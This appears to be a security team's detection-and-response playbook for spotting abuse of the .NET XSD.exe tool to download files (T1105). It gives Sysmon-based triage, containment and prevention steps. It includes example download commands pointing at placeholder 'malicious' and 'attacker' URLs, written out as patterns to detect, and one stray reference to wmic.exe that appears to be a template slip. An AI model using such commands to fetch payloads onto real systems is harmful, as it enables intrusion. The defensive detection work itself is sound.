
# T1105 — Ingress Tool Transfer · LOLBin: XSD.exe (XML Schema Definition)
**Rules Covered:**  
- CNC-E-2726320-190 — XSD URL on Command Line (Process Creation)  
- CNC-E-2726320-191 — XSD Unexpected Network Connection (Sysmon EID 3)  
- CNC-E-2726320-192 — XSD DNS Lookup Anomaly (Sysmon EID 22)  
**Last updated:** 2025-10-10

> `XSD.exe` is part of the .NET Framework and typically used for **validating XML files**. However, adversaries can abuse this tool by passing **remote URLs** or **raw IPs** as arguments to **download files** for **T1105** ingress tool transfer, making it a potential tool for malicious activity.

---

## Playbook 1 — XSD URL on Command Line (Process Creation)

### Overview
Investigate **process creation** where `XSD.exe` is invoked with **remote URLs** or **raw IPs** in the command line. This suggests the tool is being used for **downloading content**, potentially as part of an attack chain.
Examples:
- `XSD.exe /url http://example.com/malicious.xml`
- `XSD.exe /url https://192.168.1.100/attacker.xml`

### Initial Response
1. **Preserve context:** Export **Sysmon EID 1 / Security 4688** showing full `CommandLine`, `ParentImage`, `User`, and timestamp.  
2. **Parse source:** Identify **URL**, **IP address**, and **protocol** used in the command line; flag **raw IPs** and **untrusted domains**.  
3. **Secure artifacts:** Snapshot **%TEMP%**, **AppData**, and directories where files are downloaded.

### Investigation Steps
#### 1) Process & Lineage
- Validate `Image` path/signature (`C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\XSD.exe`).  
- Review **parent process** (e.g., script hosts, PowerShell, cmd, etc.) and determine legitimacy.  
- Assess the **user context** (administrator, scripted execution).

#### 2) Command‑Line Analysis
- Confirm presence of **remote URLs** or **IP addresses** in `CommandLine`; validate parameters used with `XSD.exe`.  
- Cross‑reference parameters like `/url`, `/validate`, `/schema` to identify malicious usage.

#### 3) Network & DNS
- Correlate **Sysmon EID 3** network activity attributed to `XSD.exe`.  
- Use **Sysmon EID 22** for DNS lookups related to unusual or **non‑enterprise domains/IPs**.

#### 4) Artifact & Execution
- Check **Sysmon EID 11** for files created in **%TEMP%** or **AppData**; confirm **Zone.Identifier** for remote files.  
- Look for **follow‑on processes** spawned by downloaded files (e.g., `powershell.exe`, `cmd.exe`).

### Key Artifacts
- **Sysmon EID 1 / 4688:** Process creation and command-line analysis.  
- **Sysmon EID 3:** Outbound network activity related to file downloads.  
- **Sysmon EID 22:** DNS lookups for external destinations.  
- **Sysmon EID 11:** File creation in **%TEMP%**, **AppData**, or similar directories.

### Containment Actions
- **Block** suspicious destinations; **quarantine** any downloaded artifacts; **terminate** related processes.  
- Consider **host isolation** and follow‑up investigations for persistence.

### Prevention Measures
- **AppLocker/WDAC** to limit `XSD.exe` execution on non‑admin environments.  
- Disable **external URL fetching** in `XSD.exe` and use network filtering to limit outbound traffic.

### Recovery
- Remove downloaded payloads and reset files in **%TEMP%**.  
- Review and **restore files** from secure backups if necessary.

### False Positives
- Legitimate use of `XSD.exe` for **XML schema validation** or **internal data validation** in trusted environments.

---

## Playbook 2 — XSD Unexpected Network Connection (Sysmon EID 3)

### Overview
Investigate **Sysmon EID 3** for unexpected **network connections** attributed to `XSD.exe`. **Outbound connections** could indicate an attempt to **download or upload files** for malicious purposes, corresponding to **T1105**.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 3** showing **destination IPs**/ports, associated `wmic.exe` processes, and timestamps.  
2. **Correlate with command line:** Ensure that the **network activity** matches the **URLs**/IPs identified in the previous playbook.  
3. **Monitor for unusual destinations:** Look for **external IPs** or **non‑standard ports** being accessed.

### Investigation Steps
#### 1) Network & Destination
- Analyze **destination IPs**, **ports**, and **protocols** involved.  
- Validate **external destinations** or **IP addresses** related to non‑enterprise sources.

#### 2) Correlation with DNS and Process Creation
- Use **Sysmon EID 22** to check for **DNS queries** related to the external destinations.
- Correlate with **Sysmon EID 1** for the parent process that launched `XSD.exe`.

#### 3) Artifact Discovery
- Review **Sysmon EID 11** for any files that were downloaded or modified as a result of the network connection.  
- Check for **follow‑on processes** triggered by the network activity (e.g., downloaded payloads executed by `cmd.exe`, `powershell.exe`).

### Key Artifacts
- **Sysmon EID 3:** Network connections attributed to `XSD.exe`.  
- **Sysmon EID 22:** DNS lookups for external sources.  
- **Sysmon EID 11:** Files created in **%TEMP%**, **AppData**, or other directories.

### Containment Actions
- **Block** destinations/IPs; **quarantine** any downloaded files; **terminate** related processes.  
- Consider **host isolation** for confirmation of malicious activity.

### Prevention Measures
- **AppLocker/WDAC** to limit the execution of `XSD.exe` to trusted processes.  
- Use **firewall** and **network segmentation** to block non‑approved outbound connections.

### Recovery
- Remove any downloaded payloads and reset affected file paths.
- **Restore** files from trusted sources if necessary.

### False Positives
- Legitimate **network management** tools or **XML file validation** tools using external IPs or URLs.

---

## Playbook 3 — XSD DNS Lookup Anomaly (Sysmon EID 22)

### Overview
Investigate **DNS queries** triggered by `XSD.exe` for **unusual or external domains/IPs**, particularly if the **DNS query** does not align with enterprise network infrastructure. **T1105** often involves downloading files from non‑standard sources.

### Initial Response
1. **Preserve context:** Export **Sysmon EID 22** DNS queries attributed to `XSD.exe`, noting the **domains/IPs** and timestamps.  
2. **Correlate with network traffic:** Check **Sysmon EID 3** for network traffic initiated by `XSD.exe` or related processes.
3. **Enrich the source:** Lookup **IP reputation** and domain ownership.

### Investigation Steps
#### 1) DNS Query Analysis
- Identify any **DNS anomalies**, such as newly seen domains, non‑enterprise names, or IP addresses.
- Validate DNS resolution through **external sources** or **untrusted domains**.

#### 2) Network Activity
- Correlate **Sysmon EID 3** for network traffic initiated by `XSD.exe` or related processes.
- Check for **file transfers** or command execution associated with DNS resolution.

#### 3) Artifact & Execution
- Review **Sysmon EID 11** for any files associated with these external network resources.  
- Check for **follow‑on execution** by any **malicious payloads**.

### Key Artifacts
- **Sysmon EID 22:** DNS queries and associated domains/IPs.
- **Sysmon EID 3:** Network connections to external sources.
- **Sysmon EID 11:** File creation and modification.

### Containment Actions
- **Block** suspicious IP addresses and **terminate** processes involving remote file access.  
- **Isolate** affected machines if malicious activity is confirmed.

### Prevention Measures
- **Use DNS filtering** and **network monitoring** to identify suspicious connections early.  
- Limit access to **external DNS** servers.

### Recovery
- Review and **restore** DNS configurations, files, and network connections.  
- **Tune** detection rules to reduce false positives from internal services.

### False Positives
- Legitimate **XML validation services** or **external resources** used by trusted applications or scripts.
